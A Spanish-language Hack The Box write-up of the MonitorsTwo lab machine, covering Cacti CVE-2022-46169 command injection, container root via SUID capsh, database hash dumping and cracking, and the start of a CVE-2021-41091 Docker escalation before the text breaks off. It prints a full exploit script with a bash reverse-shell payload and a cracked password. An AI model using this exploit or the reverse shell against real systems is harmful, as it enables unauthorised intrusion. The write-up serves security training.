---
layout: single
title: MonitorsTwo - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina MonitorsTwo de la plataforma de HackTheBox donde puerto 80 corre un servicio web con Cacti que es vulnerable a un Authentication Bypass y podremos convertirlo a un RCE gracias a eso ganaremos acceso a un docker donde nos convertiremos en root y podremos tener acceso ala base de datos para ver los hashes de los usuario y crackearlos con john despues de eso nos conectaremos por ssh como marcus para la escalada de privilegios nos aprovecharemos del CVE-2021-41091 es una vulnerabilidad que se encontro en Moby (Docker Engine) donde /var/lib/docker contenida subdirectorios con permisos insuficientemente restringidos lo cual permite a usuarios no privilegiados ejecutar programas"
date: 2023-09-02
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-monitorstwo/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - CVE-2022-46169
  - Docker Breakout
  - CVE-2021-41091
---

<p align="center">
<img src="/assets/images/htb-writeup-monitorstwo/banner.png">
</p>

## PortScan

Vamos a comenzar haciendo un escaneo de puertos por el protocolo **TCP**

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.211 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-01 01:21 CST
Happy 26th Birthday to Nmap, may it live to be 126!
Initiating SYN Stealth Scan at 01:21
Scanning 10.10.11.211 [65535 ports]
Discovered open port 22/tcp on 10.10.11.211
Discovered open port 80/tcp on 10.10.11.211
Completed SYN Stealth Scan at 01:21, 13.65s elapsed (65535 total ports)
Nmap scan report for 10.10.11.211
Host is up, received user-set (0.075s latency).
Scanned at 2023-09-01 01:21:17 CST for 13s
Not shown: 65295 closed tcp ports (reset), 238 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Ahora lo que haremos es copear los puertos para hacer un escaneo y ver las versiones de los servicios que están corriendo en los puertos

```bash
❯ which extractPorts
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	cat extractPorts.tmp
	rm extractPorts.tmp
}
```

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.211
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Ahora procedemos con el escaneo

```bash
❯ nmap -sCV -p22,80 10.10.11.211 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-01 01:24 CST
Nmap scan report for 10.10.11.211
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold 

Esto es lo que esta corriendo el puerto **80** que es un servicio **http**

```ruby
❯ whatweb http://10.10.11.211
http://10.10.11.211 [200 OK] Cacti, Cookies[Cacti], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[Cacti], IP[10.10.11.211], JQuery, PHP[7.4.33], PasswordField[login_password], Script[text/javascript], Title[Login to Cacti], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.4.33], X-UA-Compatible[IE=Edge], nginx[1.18.0]
```

Vemos un panel de login y la versión de `Cacti` que se esta usando

![](/assets/images/htb-writeup-monitorstwo/1.png)

Si usamos contraseñas por defecto o tratar de hacer inyecciones **SQL** vemos que no funciona

![](/assets/images/htb-writeup-monitorstwo/2.png)

Vamos a hacer **fuzzing** para ver si encontramos rutas interesantes

```bash
❯ dirsearch -u http://10.10.11.211

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.11.211/_23-09-01_01-30-13.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-09-01_01-30-13.log

Target: http://10.10.11.211/

[01:30:14] Starting: 
[01:30:16] 403 -  276B  - /.ht_wsr.txt
[01:30:16] 403 -  276B  - /.htaccess.bak1
[01:30:16] 403 -  276B  - /.htaccess.orig
[01:30:16] 403 -  276B  - /.htaccess.save
[01:30:16] 403 -  276B  - /.htaccess_extra
[01:30:16] 403 -  276B  - /.htaccess.sample
[01:30:16] 403 -  276B  - /.htaccess_orig
[01:30:16] 403 -  276B  - /.htaccess_sc
[01:30:16] 403 -  276B  - /.htaccessBAK
[01:30:16] 403 -  276B  - /.htaccessOLD
[01:30:16] 403 -  276B  - /.htm
[01:30:16] 403 -  276B  - /.html
[01:30:16] 403 -  276B  - /.htaccessOLD2
[01:30:16] 403 -  276B  - /.httr-oauth
[01:30:16] 403 -  276B  - /.htpasswds
[01:30:16] 403 -  276B  - /.htpasswd_test
[01:30:20] 200 -  249KB - /CHANGELOG
[01:30:20] 200 -   15KB - /LICENSE
[01:30:21] 200 -   11KB - /README.md
[01:30:23] 200 -   14KB - /about.php
[01:30:30] 302 -    0B  - /cache/  ->  ../index.php
[01:30:30] 301 -  313B  - /cache  ->  http://10.10.11.211/cache/
[01:30:30] 403 -  276B  - /cli/
[01:30:33] 301 -  312B  - /docs  ->  http://10.10.11.211/docs/
[01:30:33] 200 -   14KB - /docs/
[01:30:36] 302 -    0B  - /images/  ->  ../index.php
[01:30:36] 301 -  314B  - /images  ->  http://10.10.11.211/images/
[01:30:36] 302 -    0B  - /include/  ->  ../index.php
[01:30:36] 301 -  315B  - /include  ->  http://10.10.11.211/include/
[01:30:36] 200 -   14KB - /index.php
[01:30:37] 200 -   14KB - /index.php/login/
[01:30:37] 301 -  315B  - /install  ->  http://10.10.11.211/install/
[01:30:37] 302 -    0B  - /install/index.php?upgrade/  ->  install.php
[01:30:37] 302 -    0B  - /install/  ->  install.php
[01:30:38] 301 -  311B  - /lib  ->  http://10.10.11.211/lib/
[01:30:38] 302 -    0B  - /lib/  ->  ../index.php
[01:30:38] 200 -   14KB - /links.php
[01:30:38] 403 -  276B  - /log
[01:30:38] 403 -  276B  - /log/
[01:30:38] 403 -  276B  - /log/access_log
[01:30:38] 403 -  276B  - /log/access.log
[01:30:38] 403 -  276B  - /log/authorizenet.log
[01:30:38] 403 -  276B  - /log/development.log
[01:30:38] 403 -  276B  - /log/error_log
[01:30:38] 403 -  276B  - /log/error.log
[01:30:38] 403 -  276B  - /log/exception.log
[01:30:38] 403 -  276B  - /log/old
[01:30:38] 403 -  276B  - /log/librepag.log
[01:30:38] 403 -  276B  - /log/log.log
[01:30:38] 403 -  276B  - /log/payment_authorizenet.log
[01:30:38] 403 -  276B  - /log/log.txt
[01:30:38] 403 -  276B  - /log/production.log
[01:30:38] 403 -  276B  - /log/payment.log
[01:30:38] 403 -  276B  - /log/payment_paypal_express.log
[01:30:38] 403 -  276B  - /log/test.log
[01:30:38] 403 -  276B  - /log/www-error.log
[01:30:38] 403 -  276B  - /log/server.log
[01:30:39] 302 -    0B  - /logout.php  ->  index.php
[01:30:43] 301 -  315B  - /plugins  ->  http://10.10.11.211/plugins/
[01:30:43] 302 -    0B  - /plugins/  ->  ../index.php
[01:30:45] 301 -  315B  - /scripts  ->  http://10.10.11.211/scripts/
[01:30:45] 302 -    0B  - /scripts/  ->  ../index.php
[01:30:45] 403 -  276B  - /server-status/
[01:30:45] 403 -  276B  - /server-status
[01:30:45] 301 -  315B  - /service  ->  http://10.10.11.211/service/
[01:30:45] 200 -   14KB - /settings.php

Task Completed
```

## Shell as www-data 

Pues bueno luego de examinar la ruta no vemos nada interesante al buscar la versión de **cacti** vemos que tiene vulnerabilidades <https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit> y se trata de un Authentication Bypass que se convierte en un Remote Code Execution

Vamos a descargarlo

```bash
❯ wget https://raw.githubusercontent.com/ariyaadinatha/cacti-cve-2022-46169-exploit/main/cacti.py
--2023-09-01 01:37:36--  https://raw.githubusercontent.com/ariyaadinatha/cacti-cve-2022-46169-exploit/main/cacti.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.111.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1986 (1.9K) [text/plain]
Grabando a: «cacti.py»

cacti.py                        100%[=======================================================>]   1.94K  --.-KB/s    en 0s      

2023-09-01 01:37:36 (22.3 MB/s) - «cacti.py» guardado [1986/1986]
```

Solo que tienes que modificar 2 variables para que te llegue la reverse shell e indicarle la **IP** de la maquina victima

```python
❯ catn cacti.py
import requests
import urllib.parse

def checkVuln():
    result = requests.get(vulnURL, headers=header)
    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)

def bruteForce():
    # brute force to find host id and local data id
    for i in range(1, 5):
        for j in range(1, 10):
            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            result = requests.get(vulnIdURL, headers=header)
    
            if result.text != "[]":
                # print(result.text)
                rrdName = result.json()[0]["rrd_name"]
                if rrdName == "polling_time" or rrdName == "uptime":
                    return True, i, j

    return False, -1, -1


def remoteCodeExecution(payload, idHost, idLocal):
    encodedPayload = urllib.parse.quote(payload)
    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
    
    result = requests.get(injectedURL,headers=header)
    print(result.text)

if __name__ == "__main__":
    targetURL = "http://10.10.11.211"
    vulnURL = f"{targetURL}/remote_agent.php"
    # X-Forwarded-For value should be something in the database of Cacti
    header = {"X-Forwarded-For": "127.0.0.1"}
    print("Checking vulnerability...")
    if checkVuln():
        print("App is vulnerable")
        isVuln, idHost, idLocal = bruteForce()
        print("Brute forcing id...")
        # RCE payload
        ipAddress = "10.10.14.59"
        #ipAddress = input("Enter your IPv4 address")
        port = "443"
        payload = f"bash -c 'bash -i >& /dev/tcp/10.10.14.59/443 0>&1'"
        if isVuln:
            print("Delivering payload...")
            remoteCodeExecution(payload, idHost, idLocal)
        else:
            print("RRD not found")
    else:
        print("Not vulnerable")
```

Ahora nos podemos en escucha con `netcat`

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Y ejecutamos

![](/assets/images/htb-writeup-monitorstwo/3.png)

Esto es para poder hacer `ctrl+c`

```bash
www-data@50bca5e748b0:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@50bca5e748b0:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
```

## Shell as root on container

Como tal estamos en un contenedor

```bash
www-data@50bca5e748b0:/var/www/html$ hostname -I
172.19.0.3 
www-data@50bca5e748b0:/var/www/html$ 
```

Vemos que `capsh` es `SUID`

```bash
www-data@50bca5e748b0:/var/www/html$ find / \-perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
www-data@50bca5e748b0:/var/www/html$ 
```

Podemos convertirnos en **root** rápidamente <https://gtfobins.github.io/gtfobins/capsh/>

```bash
www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=0 --
root@50bca5e748b0:/var/www/html# whoami
root
root@50bca5e748b0:/var/www/html# 
```

## SSH credentials from MySQL

Vemos que hay un **script** en **bash** en la raíz

```bash
root@50bca5e748b0:/# ls 
bin   dev	    etc   lib	 media  opt   root  sbin  sys	usr
boot  entrypoint.sh  home  lib64  mnt	proc  run   srv   tmp	var
root@50bca5e748b0:/# 
```

Nos dan credenciales para la base de datos

```bash
root@50bca5e748b0:/# cat entrypoint.sh 
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"
root@50bca5e748b0:/# 
```

Ahora nos conectamos 

```bash
root@50bca5e748b0:/# mysql --host=db --user=root --password=root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 65
Server version: 5.7.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

Vemos las bases de datos

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cacti              |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.003 sec)

MySQL [(none)]> 
```

Ahora las tablas

```bash
MySQL [(none)]> use cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |
| automation_graph_rule_items         |
| automation_graph_rules              |
| automation_ips                      |
| automation_match_rule_items         |
| automation_networks                 |
| automation_processes                |
| automation_snmp                     |
| automation_snmp_items               |
| automation_templates                |
| automation_tree_rule_items          |
| automation_tree_rules               |
| cdef                                |
| cdef_items                          |
| color_template_items                |
| color_templates                     |
| colors                              |
| data_debug                          |
| data_input                          |
| data_input_data                     |
| data_input_fields                   |
| data_local                          |
| data_source_profiles                |
| data_source_profiles_cf             |
| data_source_profiles_rra            |
| data_source_purge_action            |
| data_source_purge_temp              |
| data_source_stats_daily             |
| data_source_stats_hourly            |
| data_source_stats_hourly_cache      |
| data_source_stats_hourly_last       |
| data_source_stats_monthly           |
| data_source_stats_weekly            |
| data_source_stats_yearly            |
| data_template                       |
| data_template_data                  |
| data_template_rrd                   |
| external_links                      |
| graph_local                         |
| graph_template_input                |
| graph_template_input_defs           |
| graph_templates                     |
| graph_templates_gprint              |
| graph_templates_graph               |
| graph_templates_item                |
| graph_tree                          |
| graph_tree_items                    |
| host                                |
| host_graph                          |
| host_snmp_cache                     |
| host_snmp_query                     |
| host_template                       |
| host_template_graph                 |
| host_template_snmp_query            |
| plugin_config                       |
| plugin_db_changes                   |
| plugin_hooks                        |
| plugin_realms                       |
| poller                              |
| poller_command                      |
| poller_data_template_field_mappings |
| poller_item                         |
| poller_output                       |
| poller_output_boost                 |
| poller_output_boost_local_data_ids  |
| poller_output_boost_processes       |
| poller_output_realtime              |
| poller_reindex                      |
| poller_resource_cache               |
| poller_time                         |
| processes                           |
| reports                             |
| reports_items                       |
| sessions                            |
| settings                            |
| settings_tree                       |
| settings_user                       |
| settings_user_group                 |
| sites                               |
| snmp_query                          |
| snmp_query_graph                    |
| snmp_query_graph_rrd                |
| snmp_query_graph_rrd_sv             |
| snmp_query_graph_sv                 |
| snmpagent_cache                     |
| snmpagent_cache_notifications       |
| snmpagent_cache_textual_conventions |
| snmpagent_managers                  |
| snmpagent_managers_notifications    |
| snmpagent_mibs                      |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
111 rows in set (0.003 sec)

MySQL [cacti]> 
```

Ahora tenemos un **hash** que vamos a **crackear**

```bash
MySQL [cacti]> select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
3 rows in set (0.000 sec)

MySQL [cacti]> 
```

## SSH Marcus 

Ahora **crackeamos** los **Hashes** solo tenemos suerte con **Marcus**

```bash
❯ catn hash
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
❯ john --show hash
?:funkymonkey

1 password hash cracked, 0 left
```

Ahora nos conectamos 

```bash
❯ ssh marcus@10.10.11.211
The authenticity of host '10.10.11.211 (10.10.11.211)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.211' (ECDSA) to the list of known hosts.
marcus@10.10.11.211's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 01 Sep 2023 08:08:04 AM UTC

  System load:                      0.0
  Usage of /:                       63.0% of 6.73GB
  Memory usage:                     18%
  Swap usage:                       0%
  Processes:                        241
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.211
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:a8e4


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ export TERM=xterm
marcus@monitorstwo:~$
```

## User.txt 

```bash
marcus@monitorstwo:~$ cat user.txt 
8da57533a4d9b85a7c4f6f85bec20b49
marcus@monitorstwo:~$ 
```

## Escalada de privilegios 

No encontramos nada

```bash
marcus@monitorstwo:~$ find / \-perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
marcus@monitorstwo:~$ 
```

```bash
marcus@monitorstwo:~$ sudo -l
[sudo] password for marcus: 
Sorry, user marcus may not run sudo on localhost.
marcus@monitorstwo:~$ 
```

Aquí encontramos información

```bash
marcus@monitorstwo:/var/mail$ cat marcus 
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
marcus@monitorstwo:/var/mail$
```

Como hay un contenedor podemos ver monturas

```bash
marcus@monitorstwo:~$ findmnt
TARGET                                SOURCE      FSTYPE      OPTIONS
/                                     /dev/sda2   ext4        rw,relatime
├─/sys                                sysfs       sysfs       rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security              securityfs  securityfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup                    tmpfs       tmpfs       ro,nosuid,nodev,noexec,mode=755
│ │ ├─/sys/fs/cgroup/unified          cgroup2     cgroup2     rw,nosuid,nodev,noexec,relatime,nsdelegate
│ │ ├─/sys/fs/cgroup/systemd          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,xattr,name=systemd
│ │ ├─/sys/fs/cgroup/net_cls,net_prio cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,net_cls,net_prio
│ │ ├─/sys/fs/cgroup/hugetlb          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,hugetlb
│ │ ├─/sys/fs/cgroup/pids             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,pids
│ │ ├─/sys/fs/cgroup/perf_event       cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,perf_event
│ │ ├─/sys/fs/cgroup/rdma             cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,rdma
│ │ ├─/sys/fs/cgroup/freezer          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,freezer
│ │ ├─/sys/fs/cgroup/devices          cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,devices
│ │ ├─/sys/fs/cgroup/cpu,cpuacct      cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpu,cpuacct
│ │ ├─/sys/fs/cgroup/blkio            cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,blkio
│ │ ├─/sys/fs/cgroup/memory           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,memory
│ │ └─/sys/fs/cgroup/cpuset           cgroup      cgroup      rw,nosuid,nodev,noexec,relatime,cpuset
│ ├─/sys/fs/pstore                    pstore      pstore      rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf                       none        bpf         rw,nosuid,nodev,noexec,relatime,mode=700
│ ├─/sys/kernel/tracing               tracefs     tracefs     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/debug                 debugfs     debugfs     rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/config                configfs    configfs    rw,nosuid,nodev,noexec,relatime
│ └─/sys/fs/fuse/connections          fusectl     fusectl     rw,nosuid,nodev,noexec,relatime
├─/proc                               proc        proc        rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc          systemd-1   autofs      rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pi
│   └─/proc/sys/fs/binfmt_misc        binfmt_misc binfmt_misc rw,nosuid,nodev,noexec,relatime
├─/dev                                udev        devtmpfs    rw,nosuid,noexec,relatime,size=1966932k,nr_inodes=491733,mode=755
│ ├─/dev/pts                          devpts      devpts      rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000
│ ├─/dev/shm                          tmpfs       tmpfs       rw,nosuid,nodev
│ ├─/dev/mqueue                       mqueue      mqueue      rw,nosuid,nodev,noexec,relatime
│ └─/dev/hugepages                    hugetlbfs   hugetlbfs   rw,relatime,pagesize=2M
├─/run                                tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=402612k,mode=755
│ ├─/run/lock                         tmpfs       tmpfs       rw,nosuid,nodev,noexec,relatime,size=5120k
│ ├─/run/docker/netns/f6b6254f74bf    nsfs[net:[4026532599]]
│ │                                               nsfs        rw
│ ├─/run/user/1000                    tmpfs       tmpfs       rw,nosuid,nodev,relatime,size=402608k,mode=700,uid=1000,gid=1000
│ └─/run/docker/netns/4c9bdb6f5bba    nsfs[net:[4026532660]]
│                                                 nsfs        rw
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/756FTPFO4AE7HBWVGI
├─/var/lib/docker/containers/e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69/mounts/shm
│                                     shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
│                                     overlay     overlay     rw,relatime,lowerdir=/var/lib/docker/overlay2/l/4Z77R4WYM6X4BLW7GX
└─/var/lib/docker/containers/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e/mounts/shm
                                      shm         tmpfs       rw,nosuid,nodev,noexec,relatime,size=65536k
marcus@monitorstwo:~$ 
```

<https://github.com/UncleJ4ck/CVE-2021-41091> siguiendo instrucciones primero vamos a poner la **bash** `SUID` desde el **docker**

```bash
root@50bca5e748b0:/root# chmod u+s /bin/bash
root@50bca5e748b0:/root# ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
root@50bca5e748b0:/root# 
```

Nos aprovecharemos de **Overlay2** y **merged** como lo explican

```bash
marcus@monitorstwo:/var/mail$ findmnt | grep "merged"
